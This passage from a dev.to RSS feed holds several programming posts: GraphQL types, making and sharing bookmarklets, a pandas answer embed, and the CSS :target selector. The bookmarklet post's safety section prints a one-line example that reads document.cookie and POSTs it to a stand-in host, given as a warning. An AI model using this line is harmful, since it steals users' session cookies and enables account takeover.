&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--qqElWSqU--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/9dqf6vpj5huwzzbog9p8.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--qqElWSqU--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/9dqf6vpj5huwzzbog9p8.png" alt="GraphQL object types"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;3.&lt;strong&gt;Query Type&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;This type is the entry point for the "GET" request (so to speak). It is consistent to call this type &lt;strong&gt;Query&lt;/strong&gt;. Each fields in the Query Type defines the type of data that each field will return.&lt;/p&gt;

&lt;p&gt;Here's an example of a Query type:&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--DLW4YMwZ--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/xte8ad3q024mk0bwx4w3.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--DLW4YMwZ--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/xte8ad3q024mk0bwx4w3.png" alt="GraphQL Query Type"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;4.&lt;strong&gt;Mutation Type&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;This is near identical to &lt;strong&gt;Query&lt;/strong&gt; type, but is responsible for the &lt;em&gt;Writes&lt;/em&gt; of the API. You use it for "CREATE", "UPDATE", and "DELETE".&lt;/p&gt;

&lt;p&gt;Like &lt;strong&gt;Query&lt;/strong&gt;, &lt;strong&gt;Mutation&lt;/strong&gt; type is also named consistently that way, &lt;strong&gt;Mutation&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;Here's an example of a Mutation type:&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--wiHm8hsC--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/sypi08fw2l9jllgm1khy.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--wiHm8hsC--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/sypi08fw2l9jllgm1khy.png" alt="GraphQL mutation type"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;5.&lt;strong&gt;Input Types&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Since the arguments of a field on other types can be lengthy, it will be tricky and hard to understand it if it got too long. And this is the purpose of Input Types.&lt;/p&gt;

&lt;p&gt;Input types are special objects which you can pass as argument to an input in a field, just like how I did it on the example above.&lt;/p&gt;

&lt;p&gt;Here's an example of an input type:&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--N87OlNX1--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/ohybsnxobtz7ia9ctk03.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--N87OlNX1--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/ohybsnxobtz7ia9ctk03.png" alt="GraphQL Input type"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;6.&lt;strong&gt;Enum Types&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;The &lt;strong&gt;Enum&lt;/strong&gt; types are special types since you can create your own type outside the primitive data types.&lt;/p&gt;

&lt;p&gt;This type will be more useful for a specified options of values that a field or endpoint can accept as argument or return. An &lt;strong&gt;Enum&lt;/strong&gt; can be placed wherever a Scalar is allowed.&lt;/p&gt;

&lt;p&gt;Just to be clear, *&lt;em&gt;Enum&lt;/em&gt; serializes into strings.&lt;/p&gt;

&lt;p&gt;Here's an example of an &lt;strong&gt;Enum Type&lt;/strong&gt;:&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--R3d5A2Fz--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/f3flkgtxpswkiqf75dgo.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--R3d5A2Fz--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/f3flkgtxpswkiqf75dgo.png" alt="GraphQL Enum Types"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#follow-me-on-twitter"&gt;
  &lt;/a&gt;
  Follow Me on Twitter!
&lt;/h2&gt;

&lt;p&gt;&lt;a href="https://twitter.com/menard_codes"&gt;Twitter @menard_codes&lt;/a&gt;&lt;/p&gt;

</description>
      <category>graphql</category>
      <category>systems</category>
      <category>webdev</category>
    </item>
    <item>
      <title>On bookmarklets and how to make them</title>
      <author>Siddharth</author>
      <pubDate>Thu, 24 Jun 2021 09:37:51 +0000</pubDate>
      <link>https://dev.to/siddharthshyniben/on-bookmarklets-and-how-to-make-them-45cd</link>
      <guid>https://dev.to/siddharthshyniben/on-bookmarklets-and-how-to-make-them-45cd</guid>
      <description>&lt;h3&gt;
  &lt;a href="#bookmarklets-are-bookmarks-which-execute-javascript-instead-of-opening-a-new-page-they-are-available-in-almost-every-browser-including-chrome-firefox-and-most-chromium-based-browsers"&gt;
  &lt;/a&gt;
  Bookmarklets are bookmarks which execute javascript instead of opening a new page. They are available in almost every browser, including Chrome, Firefox and most Chromium based browsers
&lt;/h3&gt;

&lt;p&gt;They are pretty easy to make, and can do almost everything, including injecting other scripts, interacting with the DOM, and absolutely everything you can do with JavaScript.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#how-to-make-a-bookmarklet"&gt;
  &lt;/a&gt;
  How to make a bookmarklet
&lt;/h2&gt;

&lt;p&gt;That's pretty easy, just create a bookmark (using whatever method your browser has) with the following content:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight javascript"&gt;&lt;code&gt;&lt;span class="nx"&gt;javascript&lt;/span&gt;&lt;span class="p"&gt;:(()&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="cm"&gt;/* Your code goes here */&lt;/span&gt;&lt;span class="p"&gt;})();&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;The &lt;code&gt;javascript:&lt;/code&gt; part tells the browser that the bookmark is actually javascript which is to be executed.&lt;/p&gt;

&lt;p&gt;The rest of the code is executed as normal, but you can make it an IIFE (Immediately-Invoked Function Expression) so that you don't accidentally overwrite any variables already defined. The code can be whatever you like, but on some sites (like GitHub) some action may be blocked (like injecting scripts)&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--JvyE2kl0--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/4ncx987kc4xjr5j9togr.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--JvyE2kl0--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/4ncx987kc4xjr5j9togr.png" alt="Screen Shot 2021-06-21 at 9.33.18 AM"&gt;&lt;/a&gt;&lt;/p&gt;
I can't inject jQuery!!



&lt;p&gt;Another neat trick is that if you make the bookmarklet return any HTML, the content of the current page will be overwritten with the HTML! (which is perfect if you want a random xkcd fetcher)&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#sharing-bookmarklets"&gt;
  &lt;/a&gt;
  Sharing bookmarklets
&lt;/h2&gt;

&lt;p&gt;It's pretty annoying to have to copy the code for a bookmarklet if you want to use it yourself, right!&lt;/p&gt;

&lt;p&gt;Well, &lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Bookmarklets are just URLs&lt;/li&gt;
&lt;li&gt;URLs can be added to the &lt;code&gt;href&lt;/code&gt; of a link&lt;/li&gt;
&lt;li&gt;A link can be bookmarked (right click or drag to bookmarks bar)&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;So, if you want to put a shareable bookmark on a website, just make an &lt;code&gt;&amp;lt;a&amp;gt;&lt;/code&gt; element with the &lt;code&gt;href&lt;/code&gt; set to whatever code&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight html"&gt;&lt;code&gt;&lt;span class="nt"&gt;&amp;lt;a&lt;/span&gt; &lt;span class="na"&gt;href=&lt;/span&gt;&lt;span class="s"&gt;"javascript:(()=&amp;gt;{alert('Hello, World!'); })();"&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;Bookmark me&lt;span class="nt"&gt;&amp;lt;/a&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Unfortunately, I can't seem to be able to add bookmarklets over here, so here's a pen with the output:&lt;/p&gt;

&lt;p&gt;&lt;iframe height="600" src="https://codepen.io/SiddharthShyniben/embed/XWMLvYy?height=600&amp;amp;default-tab=html,result&amp;amp;embed-version=2"&gt;
&lt;/iframe&gt;
&lt;/p&gt;

&lt;p&gt;Here's some more bookmarklets which you could use:&lt;/p&gt;

&lt;p&gt;&lt;iframe height="600" src="https://codepen.io/SiddharthShyniben/embed/BaWgXOW?height=600&amp;amp;default-tab=result&amp;amp;embed-version=2"&gt;
&lt;/iframe&gt;
&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#safety"&gt;
  &lt;/a&gt;
  Safety
&lt;/h2&gt;

&lt;p&gt;Bookmarklets are equal to running scripts on a page, so you have to be really careful with them.&lt;/p&gt;

&lt;p&gt;For example, this bookmarklet could easily read cookies and post them somewhere:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight javascript"&gt;&lt;code&gt;&lt;span class="nx"&gt;javascript&lt;/span&gt;&lt;span class="p"&gt;:(()&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="nx"&gt;fetch&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt;http://cookiesnatchers.com?cookie=&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="nb"&gt;document&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;cookie&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="na"&gt;method&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt;POST&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="p"&gt;})();&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Once again, you have to be really careful about what bookmarklets do. &lt;/p&gt;

&lt;p&gt;Thanks for reading! If you have any nice bookmarklets, please share them down below! &lt;/p&gt;

</description>
      <category>javascript</category>
      <category>tutorial</category>
    </item>
    <item>
      <title>Answer: Construct pandas DataFrame from items in nested dictionary</title>
      <author>Vicky Kumar</author>
      <pubDate>Thu, 24 Jun 2021 09:25:18 +0000</pubDate>
      <link>https://dev.to/imvickykumar999/answer-construct-pandas-dataframe-from-items-in-nested-dictionary-754</link>
      <guid>https://dev.to/imvickykumar999/answer-construct-pandas-dataframe-from-items-in-nested-dictionary-754</guid>
      <description>&lt;div class="ltag__stackexchange--container"&gt;
  &lt;div class="ltag__stackexchange--title-container"&gt;
    
      &lt;div class="ltag__stackexchange--title"&gt;
        &lt;h1&gt;
          &lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--7Gn-iPj_--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev.to/assets/stackoverflow-logo-b42691ae545e4810b105ee957979a853a696085e67e43ee14c5699cf3e890fb4.svg" alt=""&gt;
            &lt;a href="https://stackoverflow.com/questions/13575090/construct-pandas-dataframe-from-items-in-nested-dictionary/13581730#13581730" rel="noopener noreferrer"&gt;
              &lt;span class="title-flare"&gt;answer&lt;/span&gt; re:  Construct pandas DataFrame from items in nested dictionary
            &lt;/a&gt;
        &lt;/h1&gt;
        &lt;div class="ltag__stackexchange--post-metadata"&gt;
          &lt;span&gt;Nov 27 '12&lt;/span&gt;
        &lt;/div&gt;
      &lt;/div&gt;
      &lt;a class="ltag__stackexchange--score-container" href="https://stackoverflow.com/questions/13575090/construct-pandas-dataframe-from-items-in-nested-dictionary/13581730#13581730" rel="noopener noreferrer"&gt;
        &lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--Y9mJpuJP--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev.to/assets/stackexchange-arrow-up-eff2e2849e67d156181d258e38802c0b57fa011f74164a7f97675ca3b6ab756b.svg" alt=""&gt;
        &lt;div class="ltag__stackexchange--score-number"&gt;
          153
        &lt;/div&gt;
        &lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--wif5Zq3z--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev.to/assets/stackexchange-arrow-down-4349fac0dd932d284fab7e4dd9846f19a3710558efde0d2dfd05897f3eeb9aba.svg" alt=""&gt;
      &lt;/a&gt;
    
  &lt;/div&gt;
  &lt;div class="ltag__stackexchange--body"&gt;
    
&lt;p&gt;A pandas MultiIndex consists of a list of tuples. So the most natural approach would be to reshape your input dict so that its keys are tuples corresponding to the multi-index values you require. Then you can just construct your dataframe using &lt;code&gt;pd.DataFrame.from_dict&lt;/code&gt;, using the option &lt;code&gt;orient='index'&lt;/code&gt;: &lt;/p&gt;
&lt;pre&gt;&lt;code&gt;user_dict&lt;/code&gt;&lt;/pre&gt;…
    
  &lt;/div&gt;
  &lt;div class="ltag__stackexchange--btn--container"&gt;
    
      &lt;a href="https://stackoverflow.com/questions/13575090/construct-pandas-dataframe-from-items-in-nested-dictionary/13581730#13581730" rel="noopener noreferrer"&gt;Open Full Answer&lt;/a&gt;
    
  &lt;/div&gt;
&lt;/div&gt;


&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--I1pxfbyP--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/gdxoo6483itemxlsjbnr.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--I1pxfbyP--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/gdxoo6483itemxlsjbnr.png" alt="image"&gt;&lt;/a&gt;&lt;/p&gt;

</description>
      <category>imvickykumar999</category>
    </item>
    <item>
      <title>The :target pseudo element</title>
      <author>Siddharth</author>
      <pubDate>Thu, 24 Jun 2021 09:19:31 +0000</pubDate>
      <link>https://dev.to/siddharthshyniben/the-target-pseudo-element-3op3</link>
      <guid>https://dev.to/siddharthshyniben/the-target-pseudo-element-3op3</guid>
      <description>&lt;p&gt;The &lt;code&gt;:target&lt;/code&gt; pseudo element lets you select an element whose ID is in the URL (like &lt;code&gt;https://example.com/example/url#id-here&lt;/code&gt;. &lt;/p&gt;

&lt;p&gt;&lt;iframe height="600" src="https://codepen.io/SiddharthShyniben/embed/gOmNVvM?height=600&amp;amp;default-tab=css,result&amp;amp;embed-version=2"&gt;
&lt;/iframe&gt;
&lt;/p&gt;

</description>
      <category>css</category>
    </item>
  </channel>
</rss>
